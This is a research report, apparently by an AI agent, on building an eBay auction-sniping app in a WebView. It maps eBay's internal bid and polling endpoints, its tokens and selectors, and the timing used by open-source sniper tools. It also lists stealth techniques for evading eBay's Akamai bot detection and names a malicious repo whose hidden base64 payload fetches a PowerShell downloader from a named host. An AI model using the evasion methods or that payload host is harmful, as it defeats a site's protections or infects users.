UK increments (https://www.ebay.co.uk/help/buying/bidding/automatic-bidding?id=4014, fetched 2026-11-04):

| Current price | Increment |
|---|---|
| £0.01-£0.99 | £0.05 |
| £1.00-£4.99 | £0.20 |
| £5.00-£14.99 | £0.50 |
| £15.00-£59.99 | £1.00 |
| £60.00-£149.99 | £2.00 |
| £150.00-£299.99 | £5.00 |
| £300.00-£599.99 | £10.00 |
| £600.00-£1,499.99 | £20.00 |
| £1,500.00-£2,999.99 | £50.00 |
| £3,000.00 and up | £100.00 |

US table, used by owengregson `src/bidding/increments.js` (2025-11):

| Current price | Increment |
|---|---|
| under $1 | 0.05 |
| under $5 | 0.25 |
| under $25 | 0.50 |
| under $100 | 1 |
| under $250 | 2.50 |
| under $500 | 5 |
| under $1000 | 10 |
| under $2500 | 25 |
| under $5000 | 50 |
| $5000 and over | 100 |

### 2.9 Extraction snippet for the WebView (inferred, untested)

```js
(() => {
  const html = document.documentElement.innerHTML;
  function grab(key) {                       // brace-balanced JSON value after "KEY":{
    const needle = '"' + key + '":{';
    const at = html.indexOf(needle); if (at < 0) return null;
    let i = at + needle.length - 1, depth = 0, inStr = false;
    for (; i < html.length; i++) {
      const c = html[i];
      if (inStr) { if (c === '\\') { i++; continue; } if (c === '"') inStr = false; continue; }
      if (c === '"') inStr = true; else if (c === '{') depth++; else if (c === '}' && --depth === 0) break;
    }
    try { return JSON.parse(html.slice(at + needle.length - 1, i + 1)); } catch (e) { return null; }
  }
  const sem = grab('SEMANTIC_DATA'), box = grab('BUY_BOX'), ar = grab('AUTOREFRESH'), ad = grab('auctionData');
  return JSON.stringify({
    signedIn: !!(window.GHpre && window.GHpre.userAuth),
    status: sem && sem.listingStatus, endIso: sem && sem.endDate && sem.endDate.value,
    endTimer: box && box.bidInfo && box.bidInfo.endTime && box.bidInfo.endTime.endTime.value,
    price: box && box.bidPrice && box.bidPrice.value, bids: sem && sem.bidCount,
    reserve: sem && sem.hasReservePrice, high: sem && sem.isHighBidder, seller: sem && sem.sellerUserName,
    site: sem && sem.marketplaceListedOn, auctionData: ad, pollUrl: ar && ar.autoRefreshAction && ar.autoRefreshAction.URL,
    pollIn: ar && ar.refreshInSeconds });
})();
```

- `"SEMANTIC_DATA":{` and `"BUY_BOX":{` first match the module objects in all inspected pages.
- `"auctionData":{` first matches the GraphQL copy, which includes `extendedBidding`.

---

## 3. AUTO_REFRESH: live price, bids and end to the second

**URL**, embedded in the model and polled by eBay's page:

```
GET https://www.ebay.co.uk/itemmodules/<id>?module_groups=AUTO_REFRESH&viewer_item_relation=0&isSemiPersistentBin=false&upiState=notEligible&upiDelayTime=0&upiDelayReason=NotApplicable&includeFGQL=false
```

**Response**, verbatim (trimmed; tracking removed). Wayback 2026-04-27 11:08:06, ebay.co.uk:

```json
{"states":[
 {"eventName":"ux-app__x-auto-refresh__refreshState","state":{"module_groups":"AUTO_REFRESH","model":{"_type":"AutoRefreshModule",
   "autoRefreshAction":{"_type":"Action","URL":"/itemmodules/127820098965?module_groups=AUTO_REFRESH&viewer_item_relation=0&isSemiPersistentBin=false&upiState=notEligible&upiDelayTime=0&upiDelayReason=NotApplicable&includeFGQL=false","type":"OPERATION","name":"AUTO_REFRESH"},
   "refreshInSeconds":16}}},
 {"eventName":"ux-app__x-bid-price-section__refreshState","state":{"module_groups":"AUTO_REFRESH","model":{
   "bidPrice":{"_type":"TextualDisplayValue","value":{"value":5.37,"currency":"GBP"},"textSpans":[{"_type":"TextSpan","text":"£5.37"}]},
   "bidInfo":{"bidCount":{"_type":"TextualDisplayValue","value":1,"textSpans":[{"_type":"TextSpan","text":"1 bid"}]},
     "endTime":{"_type":"TimerModel","endTime":{"value":"2026-04-27T11:13:22.000Z"},"urgencyTime":{"value":"2026-04-27T10:13:22.000Z"},
       "counterStartTime":{"value":"2026-04-26T11:13:22.000Z"},"label":{"text":"Ends in"},"appendText":{"text":"27 Apr, 2026 12:13:22 BST"},
       "formattedText":{"textSpans":[{"text":"5m 15s"}]},"expiredText":{"textSpans":[{"text":"Ended"}]}}}}}},
 {"eventName":"ux-core__ux-call-to-action__refreshState","state":{"module_groups":"AUTO_REFRESH","model":{"BIN":{"_type":"CallToAction","disabled":true,"actionId":"BIN"}}}}
],"diagnostics":{}}
```

**eBay's own cadence.** 94 Wayback captures, ebay.com, .co.uk and .de, 2024-01 to 2026-04:

| Seconds left | refreshInSeconds |
|---|---|
| 60 or less | 2 |
| 61-115 | 3 |
| 128-174 | 6 |
| 190-224 | 9 |
| 316 | 16 |
| 451 | 24 |
| 1014 | 59 |
| about 24,000 | about 2,000 |
| 6 days (embedded in page) | 60,458 |

At the end (capture at the exact end second) the response holds only the bid-price-section state, with no auto-refresh state and an empty `formattedText`.

**Schema history:**

| Period | Change |
|---|---|
| 2024-01 to 2024-03 | wrapper `ux-app__x-hero__refresh-state` and `bidPriceLabel` ("Current bid:" / "Starting bid:") |
| from 2024-03 | `ux-app__x-auto-refresh__refreshState` |
| from 2025-06 | URL adds `includeFGQL=false` |

`ux-app__x-bid-price-section__refreshState` stayed stable from 2024-01 to 2026-04.

**Locales.** On ebay.de (2026-02, 2026-04) the texts are:

| Field | ebay.de text |
|---|---|
| price | "EUR 7,50" |
| bid count | "4 Gebote" / "1 Gebot" |
| label | "Endet in" |
| countdown | "1 Min 45 Sek" |
| appendText | "... MESZ" |
| expired | "Beendet" |

The numeric `value` fields are identical in form across sites.

**Prior art.** PsychedelicPalimpsest/ebaySniper `ebay.py:45-53` (2024-07-26) polled `https://www.ebay.com/itemmodules/{id}?module_groups=AUTO_REFRESH` and read `bidPrice.value`, `bidInfo.bidCount.value` and `bidInfo.endTime.endTime.value`.

**Recommendation (inferred):**
- Run `fetch(pollUrl, {credentials:'include'})` from the page context, which inherits the WebView's TLS, cookies and Akamai state.
- Follow `refreshInSeconds`. In the final 30-60 s, poll every 2 s like eBay's own page.
- An `endTime.value` that moves later during the final minutes means an extension.

---

## 4. Bid flow step by step (2026 unless noted)

| Step | URL / action | What shows | Selectors (try in order) | Network | Markers | Sources |
|---|---|---|---|---|---|---|
| 0. Session check | `https://www.ebay.co.uk/mye/myebay/summary` or any page | header "Hi <name>!" | `window.GHpre.userAuth`, `.gh-identity__greeting` | | Redirect to `signin.ebay.co.uk/ws/eBayISAPI.dll?SignIn&ru=...` means signed out | adbertram (2026-08), Greedbay (2026-10-18), owengregson (2025-11) |
| 1. Load item | `https://www.ebay.co.uk/itm/<id>`; maybe `?cta=placebid` (inferred to auto-open the layer); `?bolp=1` worked in 2024-07 | item page, BUY_BOX | `[data-testid="x-bid-price"]` present = auction | GET item HTML; XHR `/experience/auction/v2/bid/module_provider?item_id=<id>&modules_group=POWER_BID_LAYER&refresh_page=false&prefetch_page=true` (from `bidPrefetch`) | `listingStatus:"ACTIVE"`, `auctionPossible:true` | snapshots 2026-01/04/07; PsychedelicPalimpsest `ebay.py:64` (2024-07) |
| 2. Wait for hydration | | CTA enabled | `[data-testid="x-bid-action"]:not(.loading) #bidBtn_btn:not([disabled])` (inferred) | | server HTML ships `class="vim x-bid-action loading"` and a `disabled` attribute | snapshots 2026 |
| 3. Open the bid layer | click `#bidBtn_btn` (signed in: a `<button>` with `data-url="/bfl/placebid/<itemId>?...&currencyId=USD"`) | layer opens inline/modal; `a11yDialogLabel` "Place your bid" | `#bidBtn_btn`, `[data-testid="x-bid-action"] button`, `[data-testid="x-bid-action"] a` | GET `/bfl/placebid/<itemId>?_trksid=<trk>&currencyId=<CUR>&module=1` (layer HTML; referrer-checked, so direct navigation gives "Oops! Looks like we're having trouble connecting") | layer container: `.placebid-redesign-wrapper` (2026-04), `.place-bid-wrapper-ocv` (2025-11), `#bid-offer-summary` (2024-07), `[role=dialog]` | printing-press sniff report 2026-04-30 lines 22-24, 40-41; owengregson `performBid.js:21-22`; RavidDimant `main.py:102` |
| 4. Read the layer | | current price, power bids "Bid $X.XX" (3), max-bid field | `.place-bid-actions__powerbids-wrapper button`; price `#bid-offer-summary p span` (2024) | | lowest power bid = minimum next bid | PsychedelicPalimpsest `ebay.py:66-75` (2024-07); owengregson `performBid.js:25` |
| 5. Enter max bid | | text field | `input[id*="@placebid-section-@offer-section-@price"]`, `input[id*="@placebid"]:visible`, `input[type="tel"].textbox__control`, `input.textbox__control`, `input[id*="price"]` | none | | printing-press 2026-04; jq6l43d1 `snipe.py:40` (2026-10); RavidDimant `main.py:107` (2025-09); ProxySnipe 2025-04; owengregson 2025-11 |
| 6. Submit (no separate confirm since 2025) | tap at T-lead | button "Bid", or "Increase bid" / "Increase max bid" if already bidding | `div.place-bid-actions__submit > button.btn--fluid.btn--primary`, `button.btn--fluid.btn--primary`, `button[type="submit"]` with exact text Bid / Increase bid / Increase max bid, `button.btn--primary:not([disabled])` | POST `/bfl/placebid?action=trisk&_trksid=<trk>` body `{"itemId","attemptId":"<uuid>","ut":"1","triskXt":0,"forterToken","srt"}`, then POST `/bfl/placebid?action=confirmbid&modules=POWER_BID_LAYER&_trksid=<trk>&ocv=1` body `{"decimalPrecision":2,"price":{"currency":"USD","value":"3.25"},"itemId","elvisWarningShown":false,"adultVerified":false,"userAgreement":null,"srt","autoPayContext":{"attemptId"}}`; side call POST `/bmgt/ajax/UpdateUserTxnFlag` | | printing-press report lines 25, 42-44, 87-98; jq6l43d1 `snipe.py:41-72`; RavidDimant `main.py:114-118` |
| 7. Read the outcome | | inline notice in the layer | `span.inline-notice__main > div > span > span` (2024) | confirmbid JSON response | "Your current bid puts you in the lead." / "Another bidder is winning. Increase your bid."; modal "✓ Your current bid puts you in the lead → $3.25 current bid + $6.07 shipping → 3 bids · 1h 4m left" | PsychedelicPalimpsest `ebay.py:101-113` (2024-07); printing-press line 100 (2026-04) |

**Tokens and headers** (printing-press, 2026-04-30):
- Cookie session only; no Authorization header.
- `srt` comes from hidden inputs or JSON in the layer (format "01000b00000050...").
- Forter `forterToken` comes from the Forter SDK (format `<32-hex>_<unix-ms>__UDF43_15ck_tt`).
- `attemptId` is a client UUID.
- `_trksid` has the form `p4429486.m...`.

The app should let eBay's own JS produce all of these. It can watch the requests with `WebViewClient.shouldInterceptRequest` to timestamp the confirmbid call (inferred).

**Bid button markup**, signed out (UK 2026-04-27, verbatim minus tracking):

```html
<li><div class="vim x-bid-action loading" data-testid=x-bid-action><a class="ux-call-to-action fake-btn fake-btn--fluid fake-btn--large fake-btn--primary"
 href=https://signin.ebay.co.uk/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.co.uk%2Fitm%2F127820098965%3Fcta%3Dplacebid data-ebayui data-testid=ux-call-to-action
 id=bidBtn_btn data-elementid=MaxBidId data-elementparams=maxbid data-signinurl=https://signin.ebay.co.uk/ws/eBayISAPI.dll?SignIn&ru=...%3Fcta%3Dplacebid
 tabindex=-1 data-track-disabled=BID rel=nofollow disabled><span class=ux-call-to-action__cell><span class=ux-call-to-action__text>Submit bid</span></span></a></div></li>
```

The CTA model behind it: `{"_type":"CallToAction","text":"Submit bid","type":"PRIMARY","action":{"URL":"https://signin.ebay.co.uk/...?cta=placebid","type":"OPERATION","name":"OPEN_BID_SIGNIN","params":{"maxbid":"${maxbid}"},"clientPresentationMetadata":{"a11yDialogLabel":"Place your bid","errorMessage":"Oops. Looks like we're having trouble connecting to our server.","moduleKey":"CTA_BID_BUTTON"}},"actionId":"BID"}`

**Labels per site:**

| Site | Date | Label |
|---|---|---|
| ebay.co.uk | 2026-04, 2026-07 | "Submit bid" |
| ebay.com | 2026-01 | "Place bid" |

Do not select by label.

**Preparation used by working tools:**
- jq6l43d1 (2026-10): opens the modal ahead with a real mouse move and click, types the amount (70 ms per key), pre-hovers the submit button, sleeps to T-0.5 s, then busy-waits in 0.5 ms steps and clicks.
- isaaclkchong (2026-02): prepares at T-30 s.
- PsychedelicPalimpsest (2024): opens bid mode at T-predelay (60-90 s).
- owengregson (2025-11): opens the layer at fire time and races a second attempt 250 ms later.

**What changed over time:**

| Period | Flow | Sources |
|---|---|---|
| 2003-2019 | `offer.ebay.<tld>/ws/eBayISAPI.dll?MfcISAPICommand=MakeBid&item=<id>&maxbid=<v>` (review), then `...MakeBid&mode=1` POST with `uiid`, `stok`, `srt`; result page names `AcceptBid_HighBidder`, `AcceptBid_Outbid`, `AcceptBid_ReserveNotMet`, `MakeBidError*`, `BuyerBlockPref*` | esniper `auction.c:276-861` (last change 2019-10-19; "It does no longer work", 2024-10-30), ruippeixotog `common.conf` (2019) |
| 2017 | `/bfl/placebid/<id>` returned JSON `{redirectUrl, cssUrl, jsUrl, inlineJs, html}` with `placebid_layer_powerbid_wrapper` | Wayback 2017-10-12 |
| 2019-2021 | item page `#MaxBidId` + `#bidBtn_btn`, then offer.ebay page with `input[name="confirmbid"]`; end time in raptor JS `"endTime":<13-digit epoch>` and `span.timeMs[timems]` | Biet-O-Matic `EbayParser.js:196-206, 342-345` (2021) |
| 2024 | AUTO_REFRESH JSON, `?bolp=1`, `#bid-offer-summary`, power-bid buttons, inline notices | PsychedelicPalimpsest (2024-07) |
| 2025 | `.place-bid-actions__submit`, `input.textbox__control`, no confirm step; `.place-bid-wrapper-ocv` | ProxySnipe (2025-04), RavidDimant (2025-09), owengregson (2025-11) |
| 2026 | POWER_BID_LAYER prefetch via `/experience/auction/v2/bid/module_provider`, `.placebid-redesign-wrapper`, trisk + confirmbid JSON POSTs, UK label "Submit bid", Extended Bidding | printing-press (2026-04-30), snapshots 2026-01 to 2026-07 |

---

## 5. Results: after the bid and after the end

**Right after submit, in the layer:**

| Text | Meaning |
|---|---|
| "Your current bid puts you in the lead." | leading |
| "Another bidder is winning. Increase your bid." | an existing proxy beat your max |
| Button now "Increase max bid" | you already bid on this item (jq6l43d1 2026-10) |

Bid-too-low wording in the current layer is not captured. Legacy patterns:
- "Enter ... or more" / `enter \$([\d,.]+) or more` (ruippeixotog 2019; gixen-cli 2026, unverified);
- "To enter a higher maximum bid, please enter more than" (raising your own max, 2019).

**After the end.** Reload the item page and read the model.

| Outcome | Model | Status text (signed out) | Source |
|---|---|---|---|
| Sold (someone won) | `listingStatus:"ENDED"`, `biddingEndedAt` set, `singleSkuOutOfStock:true`, JSON-LD OutOfStock | "Item sold on Sun, 14 Dec at 5:35 PM." (UK) / "Item sold on Tue, Jan 20 at 5:00 PM." (US) | Wayback 20260105125151, 20260123010506; dealfinder `EbayScraper.py:2097-2147` |
| Ended without sale (0 bids or reserve not met) | ENDED, `bidCount` 0 or reserve | "Bidding ended on Sun, 16 Nov at 7:08 PM." | 20251207184835; dealfinder comment "(0 bids, reserve not met, or ended by the seller)" |
| Ended early by seller | `endDate` earlier than `refreshTimers.itemEnding` | "This listing was ended by the seller on Fri, 18 Apr at 4:34 PM because the item is no longer available." | 20250623154440 |
| Relisted | `relistedId` | "The seller has relisted this item or one like this." | 20250714035904 |
| Old item purged | `/itm/<id>` redirects to a `/p/` catalogue page after about 60-90 days | | dealfinder `EbayScraper.py:2094` |
| Item number moved | redirect to a different `/itm/<id>` | | xwebmcp `get_listing.js:129-134` |
| Signed-in win/loss | `isHighBidder`, `bidderAuctionDetails.userBiddingStatus` (WINNING/OUTBID, inferred) | not captured for 2026; older "You won this auction", "You didn't win this auction.", "You've been outbid" (2021), "congratulations" (2025-09) | Biet-O-Matic `EbayParser.js:590-616`; RavidDimant `main.py:128-132` |

**Confirmation options:**
- `/mye/myebay/purchase` lists won orders: `div.m-ph-card.m-order-card`, `a.nav-link[href*="/itm/"]` (Greedbay 2026-10-20).
- Bid history `/bfl/viewbids/<id>?item=<id>&rt=nc` needs sign-in.
- eBay's APIs (GraphQL `itemBiddingActivity`, Trading `GetMyeBayBuying` WonList/LostList) need developer credentials (comic-pipeline 2026-11).
- Ties go to the earlier bidder (comic-pipeline). A sniper whose max equals the final price likely lost.

**Errors seen during the bid flow or monitoring:**

| Error | How to detect it | Sources |
|---|---|---|
| Sign-in required | main frame on host `signin.ebay.<tld>` or `/ws/eBayISAPI.dll?SignIn`; title "Sign in or Register \| eBay"; logged-out bid CTA `href` points to signin with `ru=...?cta=placebid` | Greedbay, snipesnipe, 2026 snapshots |
| Browser check | `/splashui/challenge?ap=1&appName=orch&ru=<url>`, title "Pardon Our Interruption...", body "Checking your browser before you access eBay. Your browser will redirect to your requested content shortly." Clears itself; wait, do not re-navigate | adbertram 2026-08-28, snipesnipe 2026-10 |
| Captcha | `/splashui/captcha?ap=1&appName=orch&ru=...`, title "Security Measure", or "verify you are human". A person must solve it | adbertram, xwebmcp |
| Rate wall / 403 | title "Error Page \| eBay", body "SORRY Something went wrong on our end <ref> Please go back and try again or go to eBay Homepage.", `.error-header #error-info`. Sticky 8 s or more; backoff from 4 s with jitter | adbertram, xwebmcp, Greedbay `common.js` |
| Layer failure | "Oops! Looks like we're having trouble connecting to our server." (model `errorMessage`), "Refresh your browser window to try again." | snapshots 2026 |
| Cannot buy (postage) | postage row "Doesn't post to <country>" (2026-04). Bidding likely blocked (inferred) | snapshot 2026-04 |
| Buyer requirements | legacy page names "Buyer Requirements", `BuyerBlockPref`, `BuyerBlockPrefDoesNotShipToLocation`, `BuyerBlockPrefNoLinkedPaypalAccount`, `BuyerBlockPrefItemCountLimitExceeded`, `CannotBidOnItem`. Modern text unknown | esniper 2019 |
| Passkey promo / verification | `.passkeys-register-wrapper`, `[data-testid='passkey-promo']`, `#passkeys-cancel-btn`; code entry `#code`, `#validate-code-button` | owengregson 2025-11, RavidDimant 2025-09 |
| Phone verification for bidding | reported added in July 2025; UI unknown | Value Added Resource 2025-07-14 update |

---

## 6. Extended Bidding (anti-sniping)

**Timeline:**

| Date | What happened | Source |
|---|---|---|
| Jul 2025 | Test: "extending auction durations by 2 minutes when a bid is placed in the last 2 minutes", "select items in the Trading Cards category"; banner also on UK, Canada and Australia help pages | valueaddedresource.net 2025-07-07 |
| Jan-Apr 2026 | Page bundles on ebay.com and ebay.co.uk ship `popcornBiddingContent` | snapshots 2026-01-14 US, 2026-02-11 UK, 2026-04-27 UK |
| 17 Aug 2026 | All auctions in Australia: "If someone places a bid in the final minute of an auction, we'll automatically extend the auction by a short period" and "the remaining time will reset to 60 seconds until all bidding stops". Vehicles added earlier in 2026; US, UK, CA and DE help pages dropped "specific categories" (update 2026-08-14) | valueaddedresource.net 2026-08-03, updated 2026-08-23 |
| 23 Sep 2026 | "These extend the auction end time 1 minute from the time of the last bid"; rolled out on eBay Motors and eBay Australia; "The other markets may follow, including the biggest, eBay UK and eBay US" | gixen.com blog |
| 4 Nov 2026 | "We're testing extended bidding on auction listings in some categories." and "Any bid placed in the final 60 seconds resets the clock to 60 seconds. The auction ends when the clock runs out with no new bids." | ebay.co.uk help `?id=4003`, fetched today |

The 2026 bundle text, verbatim:

```
"popcornBiddingContent":{"education":{"title":"Extended bidding","body":[{"title":"This auction may extend","text":"This gives everyone a fair chance to win."},{"title":"Bids in the last 2 minutes add time","text":"Time left in the auction resets to 2 minutes with each bid."},{"title":"The highest bid wins","text":"Time runs out once all bidding stops."}]},"section":{"preWindowTitle":"This auction may extend","postWindowTitle":"Each bid now adds more time","preWindowBodyText":"Bids in the last 2 minutes add more time.","postWindowBodyText":"New bids reset the time left to 2 minutes.","link":"Learn more"}}
```

**Per-listing data.** `auctionData.extendedBidding` was null on every captured listing in 2026-01 to 2026-09. `endAtOrAfter` / `biddingEndedAt` naming fits an extension model. US auction 127622190770 went from 5 bids at 1m49s left (AUTO_REFRESH 2026-01-21 00:58:53) to 13 bids at the end, and `biddingEndedAt` equalled the scheduled end, so it did not extend.

**Gixen's adaptation (2026-09-23):**
- bids incrementally;
- detects extensions as late as possible ("requires 3 calls to eBay instead of one");
- waits up to 12 extensions before submitting the maximum;
- 6 s default on extended auctions; the mirror server bids 1 s before the end;
- win rate down about 10%.

**For our app (inferred):**
1. Flag extended auctions: non-null `extendedBidding`, the "This auction may extend" section, or `endTime` moving during polling.
2. Tell the user that last-second bids then only trigger a 60 s (or 2 min) reset.
3. After firing, keep polling AUTO_REFRESH until `biddingEndedAt` is set.
4. Optionally offer Gixen-style late incremental bids.

---

## 7. Anti-bot and sign-in experience reported by projects

- **TLS / IP blocking.**
  - fxebay (2026-10-23): "eBay blocks scrapers by TLS fingerprint: curl, Python requests, Postman, Chrome/Firefox impersonation and the Workers runtime itself all get 403 Error Page"; `curl_cffi` with a Safari fingerprint passed from a home IP.
  - dealfinder (2026-09-24): every Chrome/Edge/Firefox impersonation profile got 403 or "Pardon our interruption" from a home IP; Safari passed.
  - tamnd (2026-06-29): item pages and search are "walled from datacenter IPs by eBay's bot manager".
  - jq6l43d1 (2026-10): "Akamai lets real rendered sessions through"; authenticated cookie fetches pass where anonymous headless fetches are challenged.
- **Akamai Bot Manager + Forter + srt** on bid endpoints (printing-press 2026-04-30). Cookies `ak_bmsc`, `bm_s`, `bm_ss`; beacon `/XCFeZj/k4cD/...`.
- **Stealth used:**
  - jq6l43d1: `--disable-blink-features=AutomationControlled`, drops `--enable-automation`, hides `navigator.webdriver`.
  - owengregson: puppeteer-extra stealth, profile randomization, session prewarm with home page, scroll and a random click.
  - ProxySnipe: `playwright_stealth`.
  - isaaclkchong: blocks images, CSS, fonts and media.
  - Greedbay: checks `navigator.webdriver`.

  None of this is needed in a real WebView, but Android WebView marks itself (UA token `wv`, possibly an `X-Requested-With` header). Whether eBay reacts to that is unknown.
- **Captcha handling.** No project solves captchas. They stop and ask a human (xwebmcp, adbertram, snipesnipe), or wait out the self-clearing challenge (adbertram).
- **Sign-in:**
  - "Google sign-in is blocked in automated browsers, so if your eBay account is linked to Google, set an eBay password" (jq6l43d1). Google also refuses OAuth inside embedded WebViews (inferred from Google policy).
  - Passkey prompts and emailed codes appear (2025-2026).
- **Pacing:**
  - dealfinder: 2 s + 0-2 s jitter; 8 s block backoff; breaker after 6 blocks for 900 s.
  - xwebmcp: retries at 4 s and 8 s; space calls about 10 s.
  - printing-press: about 1 req/s with no 429 over about 30 requests; brief cites "<20 req/min/IP" (unverified).
  - eBay's own page: 2 s polls in the last minute (section 3).

---

## 8. Timing and latency figures

| Tool (date) | Lead before end | Prep | Notes |
|---|---|---|---|
| VincenzoImp, ebay.it (2024-10) | 1 s (time-of-day busy loop) | user prepares the confirm click | `#confirmBid` |
| PsychedelicPalimpsest (2024-07) | `delay` (example 10 s) | opens bid mode `predelay` 60-90 s before | power bids loop |
| ProxySnipe (2025-04) | `offset_minutes` 5 | | random 0.8-2.5 s pauses |
| RavidDimant (2025-09) | user seconds + 10 s | | "it takes maximum ~10 seconds for the item's page to be refreshed" |
| owengregson v1 (2025-11) | 1200 ms + RTT | | second `performBid` 250 ms later |
| owengregson v2 (2025-11) | workers at 1900 and 1600 ms + median RTT (3 navigations) + 200 ms | window from T-12 s | polls every 60/20/5/2/1 s by time left; reported real $540 win |
| isaaclkchong (2026-02) | primary T-6 s, backup T-3 s | prep T-30 s | checks T+2 s, reload T+10 s, 1.5 s confirmation poll |
| printing-press (2026-04) | 25 s default | | API rate limiter |
| jq6l43d1 (2026-10) | 1500 ms default; `--auto-lead` = p95 + 300 ms (minimum 500 ms) | wake at T-90 s | sleep to T-0.5 s, then 0.5 ms busy-wait |
| snipesnipe (2026-10) | 6 s default (3-60) | | 50 ms scheduler tick; over 1 s late = missed; local rehearsal fired 58 ms late |
| Gixen (2026-09) | 6 s on extended auctions; mirror 1 s | | 3 calls per snipe for extension detection |
| esniper (2019) | 10 s | prebid at 150 s | |
| Biet-O-Matic (2021) | 10 s default | | warns when the timer is over 1100 ms late; shifts overlapping auctions |

No source measured the bid round trip (submit tap to confirmbid response).

---

## 9. URL formats and site differences

**Item ID extraction.** Regex `/\/itm\/(?:[^/?#]+\/)?(\d{9,15})/` (fxebay, snipesnipe). Then query keys `item=`, `itemId=`, `iid=`. Then a bare 9-15 digit ID. All 2024-2026 examples have 12 digits (127820098965, 167906389654, 205892790315, 336671046336).

**Shapes:**

| Shape | Example |
|---|---|
| canonical | `https://www.ebay.co.uk/itm/127820098965` |
| slug | `https://m.ebay.co.uk/itm/0-10-Amp-capable-LED-Flashlight-driver-board-17mm-Cree-XHP70-XHP50-XML2-XPL-/201546868150?nav=SEARCH` (301 to www, same path and query) |
| dash slug | `https://www.ebay.co.uk/itm/-/192336704984?roken=cUgayN` |
| from search | `https://www.ebay.co.uk/itm/177654722949?_skw=edrums&itmmeta=01KC0AQ...&hash=item295d0bf185%3Ag%3AFiUAAeSwH9ZpNbpZ&itmprp=enc%3A...` |
| affiliate (ePN) | `?mkcid=1&mkrid=710-53481-19255-0&siteid=3&campid=5337256279&customid=...&toolid=10001&mkevt=1` |
| app share | `https://ebay.us/m/100axl` (301 to `https://www.ebay.co.uk/itm/317437438212?mkcid=16&mkevt=1&mkrid=711-127632-2357-0&ssspo=qPnNpvyUTpW&sssrc=2051273&ssuid=qPnNpvyUTpW&stype=1&var=&widget_ver=artemis&media=TW`, 2025-10-27); also `media=SMS`, `COPY`, `PINTEREST`; ebay.de example `...&var=465201636033&widget_ver=artemis&media=COPY` |
| ebay.io | `https://ebay.io/m/MLxzM3` (301 to `www.ebay.ca/itm/287644397617`, 2026-10) |
| legacy | `http://cgi.ebay.com/ws/eBayISAPI.dll?ViewItem&item=<id>` (2019 and earlier) |

**Variations.** Fixed-price only. Trading API: "Variations are multiple similar (but not identical) items in a fixed-price listing." `var=` is empty on auction share links. REST IDs are `v1|<id>|<variationId>` (0 for none).

**Site differences.** Same model and modules everywhere; texts and money formats differ.

| | ebay.co.uk | ebay.com | ebay.de |
|---|---|---|---|
| price text | £5.37 | US $69.99 | EUR 7,50 |
| bid label | Submit bid (2026) | Place bid | (not captured; i18n likely Bieten, inferred) |
| bid count | 1 bid / 4 bids | 13 bids | 1 Gebot / 4 Gebote |
| timer label | Ends in | Ends in | Endet in |
| zone in appendText | GMT/BST | PST/PDT | MEZ/MESZ |
| postage label | Postage: | Shipping: | |
| status date | Sun, 14 Dec at 5:35 PM | Tue, Jan 20 at 5:00 PM | |
| fees | Buyer Protection fee in displayed price (private sellers) | | |
| increments | UK table | US table | |
| marketplaceListedOn | EBAY_GB | EBAY_US | EBAY_DE |
| sign-in host | signin.ebay.co.uk | signin.ebay.com | signin.ebay.de (inferred) |

A US or German listing viewed on ebay.co.uk shows the original currency plus "Approximately £..." (`bidPriceApprox`), and `currentBidPrice.convertedFromCurrency` gives the listing currency.

---

## 10. Source inventory (dates and reliability)

**Observed evidence:**

| Source | Date | What |
|---|---|---|
| Wayback raw snapshots | 2017-10 to 2026-04 | item pages (live auction UK 2026-04-27, US 2026-01-14/21; ended 2025-04 to 2026-01), 94 AUTO_REFRESH JSON responses (2024-01 to 2026-04, incl. ebay.de), ebay.us redirects |
| mvanhorn/printing-press-library `library/commerce/ebay/.manuscripts/20260430-074134/discovery/browser-sniff-report.md` | 2026-04-30 | live signed-in bid capture on ebay.com |
| zombu4/Greedbay-Detective | 2026-10-18 to 23 | signed-out recon of ebay.com item, purchases and sign-in pages |
| kernel/xwebmcp `domains/ebay.com/get_listing.js` | 2026-10-26 | listing reader with challenge handling |
| adbertram/cli-tools `ebay/` | captures 2026-08-28 | three interstitials |
| camh000/dealfinder | 2026-07 to 10 | UK scraper, fixtures, block handling |
| Puyodead1/fxebay | 2026-10-23 | endDate/bidCount regexes, ebay.us |
| anntnzrb/agents ebay-live fixture | 2026-10-07 | trimmed live markup |
| PsychedelicPalimpsest/ebaySniper | 2024-07-26 | AUTO_REFRESH, bolp=1, power bids, notices |
| owengregson/ebay-sniper | 2025-11-14 to 17 | Puppeteer; reported real win |
| RavidDimant/eBay-Sniper-Auto-Bidding | 2025-09 | Selenium |
| yangvianno/ProxySnipe | 2025-04 | |
| jq6l43d1/ebay-sniper | 2026-10-09 | Playwright, timing |
| isaaclkchong/ebay-sniper | 2026-02-12 | TimerModel regex reliable; bid selectors mostly guessed |
| pauljones0/snipesnipe | 2026-10-15 | ebay.ca; never placed a real bid; `#confirmBid` taken from VincenzoImp |
| gixen.com blog | 2026-09-23 | |
| valueaddedresource.net | 2025-07-07, 2026-08-03 | |
| eBay help pages | fetched 2026-11-04 | `?id=4014`, `?id=4224`, `?id=4003` |
| developer.ebay.com VariationsType | fetched 2026-11-04 | |

**Historic:**
- sourceforge esniper: last code 2019-10-19; abandoned notice 2024-10-30.
- ruippeixotog/ebay-snipe-server: 2019-04-07.
- sweitzel/Biet-O-Matic-BE: 2021-01-22.
- VincenzoImp/ebay-sniper-bot: 2024-10-12, ebay.it.
- makeitjustin: 2017.

**API-only or not bidding:** jtstothard/ebay-sniper (stubbed, 2026-08), nightman-maker/ChronoScout (Browse API, 2026-10), tmehr/ebay-sniper (Offer API), alessandro-rubin/ebay-sniper (Browse watcher), bcortez183/ebay-sniper (notify only, 2026-06), hsukenooi comic-pipeline (Gixen + GraphQL/Trading status).

**Unreliable or guessed:**
- sackio/unibrowse `macros/ebay-sniper-macros.js` (2026-04, "reliability: untested");
- gixen-cli `ebay_bidder.py` MakeBid (2026-04);
- nicholasb4711 (2025-01) and daninger4995 (2023-07) copies of 2017 selectors.

**Malware, do not use:** andrey-ivanov-eng1998x8/ebay-sniper-tool-2. `sniper.py` line 1 hides `exec(base64)`, which drops a hidden PowerShell downloader from `http://soft-storage.top/worker?=8530444425/test`, and an hourly "nightly tidy" commit keeps it looking active. Also skipped as likely lures: bludmoon-coverbang/Bayside-Sniper ("free download"), todd-mandell/ebay-sniper (single .7z), Moali2009/ebay-sniper-bot (empty).

---

## 11. Local files for follow-up agents

| Path | Contents |
|---|---|
| `/var/tmp/sniper-research/wayback/live_dec/20260427110748_127820098965.html` | live UK auction page, 5.5 min before end |
| `/var/tmp/sniper-research/wayback/live_dec/20260121005928_127622190770.html` | live US page, 76 s before end |
